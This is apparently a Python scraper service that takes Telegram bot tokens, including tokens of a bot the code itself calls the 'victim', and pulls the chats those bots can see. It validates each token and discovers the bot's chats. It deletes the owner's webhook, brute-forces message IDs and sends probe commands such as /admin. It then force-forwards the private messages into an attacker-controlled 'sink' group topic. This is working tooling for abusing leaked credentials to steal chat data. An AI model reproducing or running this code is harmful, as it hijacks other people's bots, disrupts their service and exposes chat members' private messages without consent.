from typing import List, Dict, Optional
import asyncio
from telethon import TelegramClient
from telethon.sessions import MemorySession
from telethon.tl.types import Message, MessageMediaPhoto, MessageMediaDocument
from app.core.config import settings

class ScraperService:
    def __init__(self):
        self.api_id = settings.TELEGRAM_API_ID
        self.api_hash = settings.TELEGRAM_API_HASH

    async def scrape_history(self, bot_token: str, chat_id: int, limit: int = 3000) -> List[Dict]:
        """
        Attempts to scrape chat history.
        Strategy 1: Telethon (GetHistory) - Best for deep history. Often restricted.
        Strategy 2: ID Bruteforce (GetMessages) - Uses finding from Strategy 3 to scan backwards.
        Strategy 3: Bot API (getUpdates) - Fallback. Finds recent IDs (needed for Strat 2).
        """
        scraped_messages = []
        unique_ids = set()
        
        # Strategy 1: Telethon (GetHistory)
        try:
            telethon_msgs = await self._scrape_via_telethon(bot_token, chat_id, limit)
            for m in telethon_msgs:
                if m['telegram_msg_id'] not in unique_ids:
                    scraped_messages.append(m)
                    unique_ids.add(m['telegram_msg_id'])
            
            if len(scraped_messages) > 10: # If we got a decent amount, likely success
                print(f"✨ [Scraper] Telethon normal dump success: {len(scraped_messages)} messages.")
                return scraped_messages
        except Exception as e:
            # Check for common "ChatAdminRequired" or "ChatWriteForbidden"
            err_str = str(e)
            if "ChatAdminRequired" in err_str:
                print("    ⚠️ [Scraper] Telethon Restriction: Bot needs Admin to read history here.")
            else:
                print(f"    ⚠️ [Scraper] Telethon history dump failed: {e}")

        # Get 'Anchor' ID from Bot API (Strategy 3) to enable Strategy 2
        anchor_id = 0
        try:
            api_msgs = self._scrape_via_bot_api(bot_token)
            for m in api_msgs:
                # Add these finding too
                if m['telegram_msg_id'] not in unique_ids:
                    # Filter for checking chat_id if we have one?
                    # Bot API getUpdates is global, so we check if it matches target chat
                    # OR if target chat is unknown, we take all? 
                    # Here we target specific chat_id.
                    if str(m.get('chat_id')) == str(chat_id):
                        scraped_messages.append(m)
                        unique_ids.add(m['telegram_msg_id'])
                        if m['telegram_msg_id'] > anchor_id:
                            anchor_id = m['telegram_msg_id']
            print(f"    [Scraper] Found anchor ID {anchor_id} from Bot API.")
        except Exception as e:
            print(f"    [Scraper] Bot API fallback failed: {e}")

        # KICKSTART: If bot is dormant (Anchor 0), we must wake it up to get an ID.
        if anchor_id == 0:
            print("💤 [Scraper] Bot seems dormant (No recent updates). Initiating Kickstart...")
            try:
                from app.services.user_agent_srv import user_agent
                import requests
                import time

                # 1. Get Username (needed for invite)
                bot_username = "unknown"
                me_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5).json()
                if me_res.get("ok"):
                    bot_username = me_res["result"]["username"]
                
                # 2. Invite to Group (Creates a Service Message -> New ID!)
                dest = settings.MONITOR_GROUP_ID
                if dest and bot_username != "unknown":
                    print(f"    ⚡ [Scraper] Kickstarting: Inviting @{bot_username} to monitor group...")
                    if await user_agent.invite_bot_to_group(bot_username, dest):
                         print("    ⏳ [Scraper] Invite sent. Starting Command Fuzzing...")
                         
                         # === TRIGGER COMMAND FUZZING ===
                         params = ["/start", "/help", "/admin", "/config", "dashboard"]
                         for cmd in params:
                             await user_agent.send_message(dest, cmd)
                             await asyncio.sleep(1.5) # Pace out commands
                         
                         print("    ⏳ [Scraper] Fuzzing complete. Waiting for bot response...")
                         await asyncio.sleep(5) 
                         # ===============================
                         
                         # 3. Re-Poll Updates
                         retry_msgs = self._scrape_via_bot_api(bot_token)
                         for m in retry_msgs:
                             if m['telegram_msg_id'] > anchor_id:
                                 anchor_id = m['telegram_msg_id']
                                 # We don't verify chat_id for the service message strictly 
                                 # because we just want ANY valid ID to start bruteforcing backwards.
                         
                         if anchor_id > 0:
                             print(f"    ✅ [Scraper] Kickstart successful! New Anchor ID: {anchor_id}")
                         else:
                             print("    ❌ [Scraper] Kickstart failed (No update received).")
            except Exception as e:
                print(f"    ⚠️ [Scraper] Kickstart error: {e}")

        # Strategy 3: Blind ID Bruteforce (Telethon GetMessages)
        # If we found an anchor, we can look backwards!
        if anchor_id > 0:
            try:
                print(f"🔨 [Scraper] Attempting Blind ID Bruteforce from ID {anchor_id} downwards...")
                brute_msgs = await self._scrape_via_id_bruteforce(bot_token, chat_id, anchor_id, limit=500)
                for m in brute_msgs:
                    if m['telegram_msg_id'] not in unique_ids:
                        scraped_messages.append(m)
                        unique_ids.add(m['telegram_msg_id'])
                print(f"✨ [Scraper] Bruteforce added {len(brute_msgs)} messages.")
            except Exception as e:
                print(f"❌ [Scraper] Bruteforce failed: {e}")

        # Strategy 4: Blind Forwarding (Matkap Style)
        # Extremely powerful but invasive. Use if brute force yielded nothing.
        if len(scraped_messages) == 0 and anchor_id > 0:
             try:
                # We need a destination. Use MONITOR_GROUP_ID if set.
                dest_chat_id = settings.MONITOR_GROUP_ID
                if dest_chat_id:
                     print(f"🚀 [Scraper] Engaging Matkap-Style Forwarding (Target: {dest_chat_id})...")
                     
                     # AUTO-INVITE: Use User Agent to add bot to group
                     try:
                         from app.services.user_agent_srv import user_agent
                         # We need the username. We might have it from earlier or need to fetch it.
                         # We can try to get it from cache or just rely on what we know.
                         # If we don't have the username, we can't invite easily by username.
                         # But wait, we have the BOT TOKEN. We can get its username!
                         import requests
                         me_res = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5).json()
                         if me_res.get("ok"):
                             victim_username = me_res["result"]["username"]
                             print(f"    [Scraper] Auto-inviting @{victim_username} to monitor group...")
                             
                             # CLEANUP: Remove other bots first (as requested)
                             whitelist = [x.strip() for x in settings.WHITELISTED_BOT_IDS.split(",") if x.strip()]
                             if whitelist:
                                 await user_agent.cleanup_bots(dest_chat_id, whitelist)
                                 
                             await user_agent.invite_bot_to_group(victim_username, dest_chat_id)
                     except Exception as e_invite:
                         print(f"    ⚠️ [Scraper] Auto-invite failed (skipping): {e_invite}")

                     fwd_msgs = self._scrape_via_forwarding(bot_token, chat_id, dest_chat_id, anchor_id, limit=20)
                     for m in fwd_msgs:
                        if m['telegram_msg_id'] not in unique_ids:
                            scraped_messages.append(m)
                            unique_ids.add(m['telegram_msg_id'])
                     print(f"✨ [Scraper] Forwarding added {len(fwd_msgs)} messages.")
             except Exception as e:
                 print(f"❌ [Scraper] Forwarding failed: {e}")

        return scraped_messages

    def _create_forum_topic(self, bot_token: str, chat_id: int, name: str) -> int:
        """Helper to create a forum topic using a bot."""
        import requests
        try:
            url = f"https://api.telegram.org/bot{bot_token}/createForumTopic"
            res = requests.post(url, json={"chat_id": chat_id, "name": name}, timeout=10)
            if res.status_code == 200 and res.json().get("ok"):
                return res.json()["result"]["message_thread_id"]
        except Exception as e:
            print(f"    ⚠️ Topic create failed: {e}")
        return 0

    def _scrape_via_forwarding(self, bot_token: str, from_chat_id: int, to_chat_id: int, start_id: int, limit: int) -> List[Dict]:
        """
        Matkap-style: Forces bot to forward messages to a sink chat (Forum Topic).
        1. Creates a topic: '💀 @bot_username'
        2. Forwards messages there.
        3. KEEPS them there (no delete).
        """
        import requests
        import time
        from app.core.config import settings
        
        msgs = []
        base_url = f"https://api.telegram.org/bot{bot_token}"

        # 0. Get Bot Info for Topic Name
        bot_username = "unknown_bot"
        try:
            me = requests.get(f"{base_url}/getMe", timeout=5).json()
            if me.get("ok"):
                bot_username = me["result"].get("username", "unknown")
        except: pass

        # 1. Get Bot ID for proper naming
        bot_id = "0"
        try:
            me = requests.get(f"{base_url}/getMe", timeout=5).json()
            if me.get("ok"):
                bot_username = me["result"].get("username", "unknown")
                bot_id = str(me["result"].get("id", "0"))
        except: pass

        # 2. Create Topic (using Hunter Bot) with correct naming convention
        target_thread_id = 0
        if settings.MONITOR_BOT_TOKEN:
            topic_name = f"@{bot_username} / {bot_id}"
            print(f"    [Scraper] Creating topic '{topic_name}'...")
            target_thread_id = self._create_forum_topic(settings.MONITOR_BOT_TOKEN, to_chat_id, topic_name)
        
        if not target_thread_id:
             print("    [Scraper] Could not create topic (check permissions/forum mode). Forwarding to 'General'...")

        # Scan backwards from start_id
        for msg_id in range(start_id, max(0, start_id - limit), -1):
            try:
                # 2. Forward
                payload = {
                    "chat_id": to_chat_id,
                    "from_chat_id": from_chat_id,
                    "message_id": msg_id
                }
                if target_thread_id:
                    payload["message_thread_id"] = target_thread_id

                res = requests.post(f"{base_url}/forwardMessage", json=payload, timeout=5)
                
                if res.status_code == 200:
                    data = res.json()
                    if data.get("ok"):
                        result = data["result"]
                        
                        # Parse Content
                        content = result.get('text') or result.get('caption') or ""
                        
                        media_type = "text"
                        file_meta = {}
                        if 'photo' in result: media_type = 'photo'
                        elif 'document' in result: media_type = 'document'
                        
                        original_sender = "Unknown"
                        if 'forward_from' in result:
                            original_sender = result['forward_from'].get('username') or result['forward_from'].get('first_name')
                        
                        msgs.append({
                            "telegram_msg_id": msg_id,
                            "sender_name": original_sender,
                            "content": content,
                            "media_type": media_type,
                            "file_meta": file_meta,
                            "chat_id": from_chat_id
                        })
                        
                        # 3. NO DELETE - User wants to keep them!
                        
                        time.sleep(0.2) # Rate limit safety
                        
                elif res.status_code == 429:
                    print("    Rate limit hit, sleeping...")
                    time.sleep(2)
            except Exception:
                pass
                
        return msgs

    async def _scrape_via_id_bruteforce(self, bot_token: str, chat_id: int, start_id: int, limit: int) -> List[Dict]:
        """
        Fetches messages by ID batches (GetMessages) instead of listing history (GetHistory).
        Bypasses 'API restricted' error for listing history.
        """
        # Use MemorySession to avoid creating files
        client = TelegramClient(MemorySession(), self.api_id, self.api_hash)
        msgs = []
        try:
            await client.start(bot_token=bot_token)
            
            # Create batches of IDs to check
            # Scan backwards from start_id
            # e.g. 1000 IDs total
            ids_to_check = []
            for i in range(start_id, max(0, start_id - limit), -1):
                ids_to_check.append(i)
            
            # Chunk into 100s
            chunk_size = 100
            for i in range(0, len(ids_to_check), chunk_size):
                batch = ids_to_check[i:min(i + chunk_size, len(ids_to_check))]
                try:
                    # Request specific IDs
                    # check if we can filter by entity? get_messages(entity, ids=...)
                    # We need the entity (Peer).
                    # 'chat_id' might be int. Telethon needs input entity.
                    # We can try passing chat_id directly if we have seen it?
                    # Or 'get_messages(ids=...)' gets from ANY chat? No, usually needs entity.
                    # Warning: If we don't have the entity in cache, this might fail.
                    # But if we logged in and 'getUpdates' saw the chat, maybe?
                    # Let's try passing the chat_id.
                    
                    found = await client.get_messages(chat_id, ids=batch)
                    
                    for message in found:
                        if not message or not isinstance(message, Message): continue
                        
                        content = message.text or ""
                        media_type = "text"
                        file_meta = {}

                        if message.media:
                            if isinstance(message.media, MessageMediaPhoto):
                                media_type = "photo"
                                file_meta = {"wc": "photo", "id": getattr(message.media.photo, 'id', 0)}
                            elif isinstance(message.media, MessageMediaDocument):
                                media_type = "document"
                                file_meta = {"mime": message.media.document.mime_type}

                        sender_name = "Unknown"
                        if message.sender:
                            if hasattr(message.sender, 'username') and message.sender.username:
                                sender_name = message.sender.username
                            elif hasattr(message.sender, 'first_name'):
                                sender_name = message.sender.first_name

                        msgs.append({
                            "telegram_msg_id": message.id,
                            "sender_name": sender_name,
                            "content": content,
                            "media_type": media_type,
                            "file_meta": file_meta,
                            "chat_id": chat_id
                        })
                except Exception as e:
                    # print(f"Batch fail: {e}")
                    pass
        finally:
            await client.disconnect()
        return msgs

    async def _scrape_via_telethon(self, bot_token: str, chat_id: int, limit: int) -> List[Dict]:
        # Use MemorySession to avoid creating files
        client = TelegramClient(MemorySession(), self.api_id, self.api_hash)
        msgs = []
        try:
            print(f"🔐 [Scraper] Logging in as bot (Telethon)...")
            await client.start(bot_token=bot_token)
            
            print(f"📖 [Scraper] Fetching history via Telethon (Limit: {limit})...")
            
            # ATTEMPT 1: Resolve Entity explicitly
            # Fresh MemorySession needs to "eager load" the chat
            entity = None
            try:
                entity = await client.get_entity(chat_id)
            except ValueError:
                print("    ⚠️ [Scraper] Entity not found directly. Refreshing dialogs...")
                await client.get_dialogs(limit=100) # Populate cache
                try:
                    entity = await client.get_entity(chat_id)
                except:
                    print("    ❌ [Scraper] Could not resolve entity even after dialog refresh.")
            
            target = entity if entity else chat_id
            
            async for message in client.iter_messages(target, limit=limit):
                if not isinstance(message, Message): continue
                
                content = message.text or ""
                media_type = "text"
                file_meta = {}

                if message.media:
                    if isinstance(message.media, MessageMediaPhoto):
                        media_type = "photo"
                        file_meta = {"wc": "photo", "id": getattr(message.media.photo, 'id', 0)}
                    elif isinstance(message.media, MessageMediaDocument):
                        media_type = "document"
                        file_meta = {"mime": message.media.document.mime_type}
                    else:
                        media_type = "other"

                sender_name = "Unknown"
                if message.sender:
                    if hasattr(message.sender, 'username') and message.sender.username:
                        sender_name = message.sender.username
                    elif hasattr(message.sender, 'first_name'):
                        sender_name = message.sender.first_name

                msgs.append({
                    "telegram_msg_id": message.id,
                    "sender_name": sender_name,
                    "content": content,
                    "media_type": media_type,
                    "file_meta": file_meta,
                    "chat_id": chat_id # Ensure we track where it came from
                })
        finally:
            await client.disconnect()
        return msgs

    def _scrape_via_bot_api(self, bot_token: str) -> List[Dict]:
        """
        Fallback: Use requests to hit https://api.telegram.org/bot<token>/getUpdates
        If webhook is active, delete it first.
        """
        import requests
        print(f"🔄 [Scraper] Attempting Bot API getUpdates fallback...")
        
        base_url = f"https://api.telegram.org/bot{bot_token}"
        
        # First attempt
        res = requests.get(f"{base_url}/getUpdates", params={'limit': 100}, timeout=15)
        
        # Check for webhook conflict error
        if res.status_code == 409 or (res.status_code == 200 and not res.json().get('ok') and 'webhook' in res.text.lower()):
            print(f"    ⚠️ [Scraper] Webhook detected, attempting to delete...")
            try:
                # Delete the webhook
                del_res = requests.post(f"{base_url}/deleteWebhook", timeout=10)
                if del_res.status_code == 200 and del_res.json().get('ok'):
                    print(f"    ✅ [Scraper] Webhook deleted successfully!")
                    # Retry getUpdates after deleting webhook
                    import time
                    time.sleep(1)  # Brief pause for Telegram to process
                    res = requests.get(f"{base_url}/getUpdates", params={'limit': 100}, timeout=15)
                else:
                    print(f"    ❌ [Scraper] Failed to delete webhook: {del_res.text}")
            except Exception as e:
                print(f"    ❌ [Scraper] Webhook deletion error: {e}")
        
        msgs = []
        if res.status_code == 200 and res.json().get('ok'):
            updates = res.json().get('result', [])
            for update in updates:
                # We care about 'message', 'edited_message', 'channel_post'
                target = update.get('message') or update.get('channel_post') or update.get('edited_message')
                if not target: continue
                
                chat = target.get('chat', {})
                sender = target.get('from', {})
                
                content = target.get('text') or target.get('caption') or ""
                
                # Determine media
                media_type = "text"
                file_meta = {}
                if 'photo' in target:
                    media_type = "photo"
                elif 'document' in target:
                    media_type = "document"
                    
                msgs.append({
                    "telegram_msg_id": target.get('message_id'),
                    "sender_name": sender.get('username') or sender.get('first_name') or "Unknown",
                    "content": content,
                    "media_type": media_type,
                    "file_meta": file_meta,
                    "chat_id": chat.get('id')
                })
        else:
            print(f"    ❌ Bot API Error: {res.text}")
            
        return msgs

    async def discover_chats(self, bot_token: str) -> (Dict, List[Dict]):
        """
        Validates a bot token and discovers chats using Telegram Bot API.
        Returns: (bot_info, discovered_chats)
        """
        import requests
        
        base_url = f"https://api.telegram.org/bot{bot_token}"
        discovered_chats = []
        bot_info = {}
        
        try:
            print(f"🔍 [Discovery] Validating token {bot_token[:15]}... via Bot API")
            
            # Step 1: Validate token with getMe
            me_res = requests.get(f"{base_url}/getMe", timeout=10)
            if me_res.status_code != 200 or not me_res.json().get('ok'):
                print(f"    ❌ Token invalid or revoked")
                return {}, []
            
            bot_info = me_res.json().get('result', {})
            print(f"    ✅ Token valid! Bot: @{bot_info.get('username', 'unknown')}")
            
            # Step 2: Get recent chats from getUpdates
            updates_res = requests.get(f"{base_url}/getUpdates", params={'limit': 100}, timeout=15)
            if updates_res.status_code == 200 and updates_res.json().get('ok'):
                updates = updates_res.json().get('result', [])
                
                # Extract unique chats from updates
                seen_chats = set()
                for update in updates:
                    # Check message, edited_message, channel_post, etc.
                    for key in ['message', 'edited_message', 'channel_post', 'edited_channel_post', 'my_chat_member', 'chat_member']:
                        if key in update:
                            chat = update[key].get('chat', {})
                            chat_id = chat.get('id')
                            if chat_id and chat_id not in seen_chats:
                                seen_chats.add(chat_id)
                                chat_type = chat.get('type', 'unknown')
                                chat_name = chat.get('title') or chat.get('username') or chat.get('first_name') or str(chat_id)
                                
                                discovered_chats.append({
                                    "id": chat_id,
                                    "name": chat_name,
                                    "type": chat_type
                                })
                                print(f"    📍 Found Chat: {chat_name} (ID: {chat_id}, Type: {chat_type})")
                
                # If no updates but token is valid, use bot's own ID as fallback
                if not discovered_chats:
                    # Token works but no recent activity - still valid!
                    # Use a placeholder to indicate token is valid but no chats found
                    print(f"    ℹ️ Token valid but no recent chat activity")
                    # Return bot info as a "chat" so validation passes
                    discovered_chats.append({
                        "id": bot_info.get('id'),
                        "name": f"@{bot_info.get('username', 'bot')} (Bot Self)",
                        "type": "bot_self"
                    })
            
            print(f"🏁 [Discovery] Found {len(discovered_chats)} chat(s) for this bot.")
            
        except requests.Timeout:
            print(f"    ⚠️ Telegram API timeout")
        except Exception as e:
            print(f"Error discovering chats: {e}")
            
        return bot_info, discovered_chats

scraper_service = ScraperService()
